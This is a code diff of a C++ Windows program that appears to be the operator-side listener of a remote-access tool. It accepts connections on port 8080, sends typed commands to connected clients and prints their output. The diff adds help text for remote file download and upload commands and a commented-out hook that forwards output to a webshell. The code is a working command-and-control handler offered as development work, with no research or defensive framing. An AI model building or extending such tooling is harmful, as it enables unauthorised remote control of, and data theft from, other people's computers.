@@ -6,6 +6,7 @@
 #include <ws2tcpip.h>
 #include <string>
 #include <thread>
+#include <chrono>
 #include <mutex>
 #include <Windows.h>
 
@@ -19,7 +20,7 @@ std::string xClientID = "XCLIENT00001";
 
 
 //------------------------------------------------------------------------------------------ASCII STARTUP
-void xPrintAsciiArtBanner() {
+void PrintAsciiArtBanner() {
     std::cout << "@@@  @@@  @@@@@@@@             @@@@@@     @@@@@@  \n"
         "@@@  @@@  @@@@@@@@             @@@@@@@   @@@@@@@  \n"
         "@@!  @@@       @@!                 @@@  !@@       \n"
@@ -49,7 +50,7 @@ void xHandleClient(SOCKET clientSocket) {
         std::string yCommand(yBuffer, yBytesRead); // Received Data -> Output
         {
             std::lock_guard<std::mutex> lock(mtx);
-            std::cout << std::endl << "Received Output: " << yCommand << std::endl;
+            std::cout << std::endl << yCommand << std::endl;
 
             //xSendAjaxRequest(xClientID, yCommand); // Received Output -> Ajax -> Webshell
         }
@@ -61,6 +62,12 @@ void xHandleClient(SOCKET clientSocket) {
 void xInputThread(SOCKET clientSocket) {
     while (true) {
         std::string yUserInput;
+
+        // Sleep Function is used to prevent against double print Bug (Local Network => 100, Internet => 150 / 175 / 200)
+        // Sleep Function can be deleted if -> [std::cout << "Enter a...] is deleted too or commented out
+        Sleep(150); // Windows
+        //usleep(150); // Linux -> #include <unistd.h>
+
         std::cout << "Enter a Command: ";
         std::getline(std::cin, yUserInput);
 
@@ -68,8 +75,23 @@ void xInputThread(SOCKET clientSocket) {
 
         send(clientSocket, yUserInput.c_str(), yUserInput.length(), 0); // Send -> Client
 
-        if (yUserInput == "exit ") {
-            break; // exit -> End Input Loop
+        if (yUserInput == "exit ") { // exit -> End Input Loop
+            break;
+        } 
+        
+        else if (yUserInput == "xdownload ") { // Download File
+            std::cout << "DOWNLOAD FILES" << std::endl;
+            std::cout << "Usage: [File , Destination] file_i_want_to_download.txt , C:/Destination/Path" << std::endl;
+        } 
+        
+        else if (yUserInput == "xupload ") { // Upload File
+            std::cout << "UPLOAD FILES" << std::endl;
+            std::cout << "Usage: [File , Destination] file_i_want_to_upload.txt , C:/Destination/Path" << std::endl;
+        } 
+        
+        else if (yUserInput == "xcolor ") { // Change Colors
+            std::cout << "CHANGE COLORS" << std::endl;
+            std::cout << "Usage: [Font Color , Background Color] green , black" << std::endl;
         }
     }
 }
@@ -84,12 +106,12 @@ void xAjaxInput(SOCKET clientSocket, const std::string& command) {
 //------------------------------------------------------------------------------------------LISTENER STARTUP FUNCTION
 void xStartListener(int yPort) {
     WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { // WSAStartup Failed
         std::cerr << "WSAStartup Failed!" << std::endl;
         return;
     }
 
-    SOCKET listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    SOCKET listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // Socket Creation Failed 
     if (listener == INVALID_SOCKET) {
         std::cerr << "Socket Creation Failed!" << std::endl;
         WSACleanup();
@@ -101,14 +123,14 @@ void xStartListener(int yPort) {
     serverAddr.sin_addr.s_addr = INADDR_ANY;
     serverAddr.sin_port = htons(yPort);
 
-    if (bind(listener, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
+    if (bind(listener, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) { // Binding Failed
         std::cerr << "Bind Failed!" << std::endl;
         closesocket(listener);
         WSACleanup();
         return;
     }
 
-    if (listen(listener, SOMAXCONN) == SOCKET_ERROR) {
+    if (listen(listener, SOMAXCONN) == SOCKET_ERROR) { // Listen Failed
         std::cerr << "Listen Failed!" << std::endl;
         closesocket(listener);
         WSACleanup();
@@ -117,7 +139,7 @@ void xStartListener(int yPort) {
 
     std::cout << "Listening for Incoming Connections on Port " << yPort << "..." << std::endl;
 
-    while (true) {
+    while (true) { // True -> Incoming Connection -> Accept
         SOCKET clientSocket = accept(listener, NULL, NULL);
         if (clientSocket == INVALID_SOCKET) {
             std::cerr << "Accept failed!" << std::endl;
@@ -139,8 +161,9 @@ void xStartListener(int yPort) {
 
 //------------------------------------------------------------------------------------------MAIN FUNCTION
 int main() {
-    SetConsoleOutputCP(CP_UTF8);
-    xPrintAsciiArtBanner();
+    SetConsoleOutputCP(CP_UTF8); // Set Console Output -> UTF8
+    PrintAsciiArtBanner(); // Print Ascii Banner
     xStartListener(8080); // Call -> xStartListener Function
     return 0;
 }
+
